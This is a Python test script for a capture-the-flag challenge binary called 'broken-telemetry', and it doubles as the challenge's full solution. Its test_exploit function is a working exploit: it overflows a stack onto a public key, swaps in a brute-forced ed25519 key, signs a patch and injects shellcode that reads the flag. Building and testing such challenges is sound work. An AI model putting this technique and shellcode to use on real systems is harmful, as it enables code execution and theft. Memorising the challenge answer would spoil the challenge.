#!/usr/bin/env python3

import struct
import subprocess

from enum import IntEnum, auto
from pathlib import Path

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ed25519
from pwn import process, context, asm, log


MYDIR = Path(__file__).parent
PRIVKEY_PEM = MYDIR / 'privkey.pem'


class CMD(IntEnum):
    TELEMETRY_TIMESTAMP = 0
    TELEMETRY_GPS = auto()
    TELEMETRY_ECIF = auto()
    TELEMETRY_ORBIT = auto()
    TELEMETRY_ORIENTATION = auto()
    TELEMETRY_OMEGA = auto()
    TELEMETRY_MAX = TELEMETRY_OMEGA

    PATCH = 0xfe
    RESET = 0xff


def run(commands, env=None):
    try:
        process = subprocess.run(["./broken-telemetry"], input=commands, capture_output=True, env=env, timeout=5)

        try:
            print("----- stdout -----")
            print(process.stdout.decode())
            print("----- stderr -----")
            print(process.stderr.decode())
        except UnicodeDecodeError:
            print('--- Decoding error! ---')
            print("----- stdout -----")
            print(repr(process.stdout))
            print("----- stderr -----")
            print(repr(process.stderr))
    except subprocess.TimeoutExpired:
        print("Timeout expired.")


def create_keys():
    private_key = ed25519.Ed25519PrivateKey.generate()
    public_key = private_key.public_key()
    public_raw = public_key.public_bytes(
        encoding=serialization.Encoding.Raw,
        format=serialization.PublicFormat.Raw
    )
    return private_key, public_key, public_raw


def sign(data, private_key=None):
    if private_key is None:
        with PRIVKEY_PEM.open('rb') as f:
            private_key = serialization.load_pem_private_key(f.read(), password=None)
    signature = private_key.sign(data)
    assert len(signature) == 64
    return signature


def patch_command(patch, offset, private_key=None):
    signature = sign(patch, private_key=private_key)
    assert len(signature) == 64
    return struct.pack(f">BLB{len(patch)}s64s", CMD.PATCH, offset, len(patch), patch, signature)


def test_patch():
    print("=== Testing PATCH ===")
    patch = b"xxx"
    payload = patch_command(patch, 0)
    run(payload)


def test_telemetry():
    print("=== Testing Telemetry Reading ===")

    for cmd in range(CMD.TELEMETRY_MAX + 1):
        print(f"--- Command {CMD(cmd).name} ---")
        payload = struct.pack(">BL", cmd, 0)
        run(payload)


def test_reset():
    print("=== Testing RESET ===")
    payload = struct.pack(">B", CMD.RESET) * 5
    run(payload)


def brute_ed25519_keypair(suffix):
    # Bruteforce ED25519 key pair generatoin until given suffix bytes are
    # obtained in the public key

    while 1:
        private_key = ed25519.Ed25519PrivateKey.generate()
        public_key = private_key.public_key()
        public_raw = public_key.public_bytes(
            encoding=serialization.Encoding.Raw,
            format=serialization.PublicFormat.Raw
        )

        if public_raw.endswith(suffix):
            break

    return private_key, public_raw


def test_exploit():
    print("=== Testing Exploit ===")

    p = process('./broken-telemetry')
    context(binary=p.elf)

    # Map pubkey above thread stack with a random patch attempt that will fail.
    # Make it fail at offset validation before invoking libcrypto, so that
    # libcrypto does not map its own stuff into memory above the pubkey.
    p.send(struct.pack(">BLB1s64s", CMD.PATCH,
        0xffffff, # offset
        1,        # size
        b'A',     # data
        b'A' * 64 # signature
    ))

    # Map telemetry pages as cushion right above pubkey, so that we can stack
    # overflow into them
    p.send(struct.pack(">BL", CMD.TELEMETRY_TIMESTAMP, 0))

    # Overflow thread stack and point right before pubkey
    p.send(struct.pack(">B", CMD.RESET) * 74)

    # Request a new patch overwriting pubkey with patch data. Again, the patch
    # does not need to pass signature verification, just overwrite the pubkey.
    # The first two bytes of sig we pass will occupy the last two bytes of
    # pubkey, while the first 30 are controlled.
    log.info('Calculating ED25519 key...')
    dummy_sig = b'X' * 64
    private_key, public_raw = brute_ed25519_keypair(suffix=dummy_sig[:2])
    assert public_raw.endswith(dummy_sig[:2])
    log.info('Pubkey: ' + public_raw.hex())

    patch = b'A' * 32 + public_raw[:-2]
    sz = len(patch)
    assert sz == 62

    p.send(struct.pack(f">BLB{sz}s64s", CMD.PATCH, 0xffffff, sz, patch, dummy_sig))

    # Move stack up one frame to avoid messing up the now overwritten pubkey
    p.send(struct.pack(">B", CMD.RESET))

    # Send malicious patch with good signature to overwrite the telemetry
    # command handler with shellcode.
    patch = asm('''
        /* open("/flag", O_RDONLY, 0) */
        lea     rdi, [rip + path]
        xor     esi, esi
        xor     edx, edx
        mov     eax, SYS_open
        syscall

        /* sendfile(1, eax, NULL, 0x100) */
        xor      edi, edi
        inc      edi
        mov      esi, eax
        xor      edx, edx
        mov      r10d, 0x100
        mov      eax, SYS_sendfile
        syscall

        /* exit_group(0) */
        xor      edi, edi
        mov      eax, SYS_exit_group
        syscall

        path:
            .asciz "flag"
    ''')

    sz = len(patch)
    assert sz <= 62

    sig = private_key.sign(patch)
    assert len(sig) == 64

    # NOTE: handler offset is hardcoded since the binary is stripped...
    # NOTE: ... it will likely change and need update if recompiled!
    offset = 0x17ae
    log.info('Sending shellcode patch...')
    p.send(struct.pack(f">BLB{sz}s64s", CMD.PATCH, offset, sz, patch, sig))

    # Invoke telemetry cmd to run shellcode. GG!
    log.info('Invoking shellcode...')
    p.clean(timeout=1)
    p.send(struct.pack(">BL", CMD.TELEMETRY_TIMESTAMP, 0))

    # This should print the flag
    out = p.recvall(1)
    p.close()

    assert b'space{this_is_a_test_flag}' in out
    print('Exploit successful!')



def test_exploit_from_file():
    print("=== Testing Exploit from File ===")

    p = process('./broken-telemetry')

    # Same payload as test_exploit() above, just in a file
    with open('expl.bin', 'rb') as f:
        p.send(f.read())

    out = p.recvall(1)
    p.close()

    assert b'space{this_is_a_test_flag}' in out
    print('Exploit successful!')


if __name__ == "__main__":
    test_telemetry()
    test_patch()
    test_reset()
    test_exploit()
    test_exploit_from_file()
